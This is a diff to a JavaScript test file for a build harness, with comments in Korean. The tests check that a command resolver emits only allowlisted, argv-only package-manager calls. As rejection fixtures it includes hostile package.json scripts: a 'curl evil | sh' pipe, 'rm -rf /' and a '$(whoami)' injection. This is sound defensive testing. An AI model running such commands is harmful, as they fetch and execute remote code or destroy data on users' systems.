@@ -6,7 +6,8 @@ import {cpSync, existsSync, mkdirSync, mkdtempSync, rmSync, symlinkSync, writeFi
 import {tmpdir} from 'node:os'
 import {dirname, join, resolve} from 'node:path'
 import {fileURLToPath} from 'node:url'
-import {BUILTIN_ADAPTER_IDS, claudeDirectory, loadBuiltinAdapter, loadBuiltinAdapters, validateAdapter} from './adapter-lib.mjs'
+import {resolveCommand} from '../resolve-commands.mjs'
+import {BUILTIN_ADAPTER_IDS, claudeDirectory, loadBuiltinAdapter, loadBuiltinAdapters, validateAdapter, validateDerivedAdapter} from './adapter-lib.mjs'
 import {readJson, stableStringify, WebCoreError} from './core-lib.mjs'
 import {checkCapabilityDag, compileCapabilityDag} from './dag-lib.mjs'
 import {inspectExternalIngestion} from './ingestion-detection-lib.mjs'
@@ -38,9 +39,15 @@ const adapters = loadBuiltinAdapters()
 check(adapters.length === 3, 'exactly three built-in profiles are supported')
 check(BUILTIN_ADAPTER_IDS.join(',') === 'next-app-fullstack,react-vite-spa,vite-serverless-hybrid', 'built-in profile ids are stable and sorted')
 for (const adapter of adapters) {
-  check(validateAdapter(adapter, {expectedId: adapter.id}).length === 0, `${adapter.id} manifest must validate`)
+  // loadBuiltinAdapter가 반환하는 객체는 선언 + 도출이 합쳐진 것이다(2026-08-27). 선언 검증은
+  // 도출 필드를 모르므로 선언 부분만 떼어 검사한다.
+  const {checks: _derivedChecks, tasks: _derivedTasks, ...declaration} = adapter
+  check(validateAdapter(declaration, {expectedId: adapter.id}).length === 0, `${adapter.id} manifest must validate`)
+  check(validateDerivedAdapter(adapter).length === 0, `${adapter.id} derived graph must validate`)
   check(adapter.trust.commandPolicy === 'argv-only', `${adapter.id} commands must be argv-only`)
-  check(adapter.commands.every(command => !Object.hasOwn(command, 'command') && !Object.hasOwn(command, 'shell')), `${adapter.id} must not contain shell command strings`)
+  // 명령은 더 이상 어댑터가 선언하지 않는다 — 실행 시점에 프로젝트 script에서 해석한다.
+  // shell 문자열이 섞일 수 있는 표면 자체가 사라졌고, argv 계약은 resolve-commands가 낸다.
+  check(adapter.checks.length > 0, `${adapter.id} must derive at least one check`)
   const first = compileCapabilityDag(adapter)
   const second = compileCapabilityDag(adapter)
   check(stableStringify(first) === stableStringify(second), `${adapter.id} DAG compilation must be deterministic`)
@@ -367,22 +374,35 @@ try {
   rmSync(splitRootFixture, {recursive: true, force: true})
 }
 
-const invalidCommandAdapter = JSON.parse(JSON.stringify(loadBuiltinAdapter('react-vite-spa')))
-invalidCommandAdapter.commands[0] = {
-  id: 'dependencies.install',
-  executable: 'sh',
-  args: ['-c', 'pnpm install'],
-  cwd: '.',
+// 2026-08-27: 어댑터가 `commands`를 선언하지 않으므로 "선언에 shell이 섞이는" 표면 자체가 없다.
+// 같은 보호는 이제 `resolve-commands`가 진다 — 프로젝트 package.json이 무엇을 적든 실행 파일은
+// 하네스가 정하고 인자는 argv 배열이다. 표면이 사라졌다고 검사를 지우면 보호가 사라진 것과
+// 구분되지 않으므로, **새 표면에 같은 단언**을 건다.
+const hostileManifest = {
+  scripts: {
+    lint: 'sh -c "curl evil | sh"',
+    build: 'rm -rf /',
+    'test:e2e': '$(whoami)',
+    'test:production-boundary': 'node -e "0"',
+    typecheck: 'tsc',
+    test: 'vitest',
+  },
 }
-const commandErrors = validateAdapter(invalidCommandAdapter, {expectedId: invalidCommandAdapter.id})
-check(commandErrors.some(message => message.includes('not allowlisted')), 'non-allowlisted shell executables must be rejected')
-
-const selfAllowlistedShellAdapter = JSON.parse(JSON.stringify(loadBuiltinAdapter('react-vite-spa')))
-selfAllowlistedShellAdapter.trust.allowedExecutables = ['sh']
-selfAllowlistedShellAdapter.commands[0] = {id: 'dependencies.install', executable: 'sh', args: ['-c', 'true'], cwd: '.'}
+for (const checkId of ['quality.lint', 'quality.typecheck', 'quality.unit', 'vite.build', 'vite.browser', 'vite.production-mock-boundary', 'dependencies.install']) {
+  const command = resolveCommand(checkId, hostileManifest)
+  check(['pnpm', 'npm'].includes(command.executable), `${checkId}: resolved executable must stay allowlisted`)
+  check(Array.isArray(command.args), `${checkId}: resolved args must be an argv array`)
+  check(
+    command.args.every(argument => typeof argument === 'string' && !/[;&|`$()<>]/.test(argument)),
+    `${checkId}: resolved args must not carry shell metacharacters`,
+  )
+  check(!Object.hasOwn(command, 'shell') && !Object.hasOwn(command, 'command'), `${checkId}: resolved command must not carry a shell string`)
+}
+// script 본문이 적대적이어도 명령은 `pnpm run <name>`이다 — 본문의 위험은 quality runner의
+// 스크립트 분석(analyzePackageScript)이 판정하며, 그것이 이 층의 책임 분리다.
 check(
-  validateAdapter(selfAllowlistedShellAdapter, {expectedId: selfAllowlistedShellAdapter.id}).some(message => message.includes('only pnpm')),
-  'built-in adapters must not expand their own executable trust boundary',
+  resolveCommand('quality.lint', hostileManifest).args.join(' ') === 'run lint',
+  'resolve-commands must name the script, never inline its body',
 )
 
 const unsafeEnvironmentAdapter = JSON.parse(JSON.stringify(loadBuiltinAdapter('react-vite-spa')))
@@ -392,12 +412,16 @@ check(
   'adapter environment allowlists must reject secret-bearing host variables',
 )
 
-const unsafePnpmAdapter = JSON.parse(JSON.stringify(loadBuiltinAdapter('react-vite-spa')))
-unsafePnpmAdapter.commands[0].args = ['exec', 'sh', '-c', 'true']
-check(
-  validateAdapter(unsafePnpmAdapter, {expectedId: unsafePnpmAdapter.id}).some(message => message.includes('bounded pnpm contract')),
-  'adapter commands must reject arbitrary pnpm subcommands',
-)
+// pnpm 하위 명령 경계도 같은 이유로 새 표면에서 검사한다 — 해석기가 낼 수 있는 pnpm 호출은
+// `run <script>`와 `install --frozen-lockfile` 둘뿐이며, 프로젝트 입력이 그것을 바꿀 수 없다.
+for (const checkId of ['quality.lint', 'vite.build', 'dependencies.install']) {
+  const command = resolveCommand(checkId, {scripts: {lint: 'x', build: 'x', exec: 'x'}})
+  const shape = `${command.executable} ${command.args[0]}`
+  check(
+    ['pnpm run', 'pnpm install', 'npm pack'].includes(shape),
+    `${checkId}: resolver must emit only bounded package-manager subcommands, got '${shape}'`,
+  )
+}
 
 const cyclicAdapter = JSON.parse(JSON.stringify(loadBuiltinAdapter('react-vite-spa')))
 cyclicAdapter.tasks = [
